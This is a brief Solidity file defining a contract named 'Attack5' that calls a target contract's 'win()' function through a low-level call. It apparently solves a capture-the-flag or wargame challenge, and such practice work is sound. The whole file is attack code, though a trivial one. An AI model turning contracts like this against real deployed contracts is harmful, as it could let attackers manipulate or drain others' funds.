// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Attack5 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        (bool success, ) = target.call(abi.encodeWithSignature("win()"));
        require(success);
    }
}
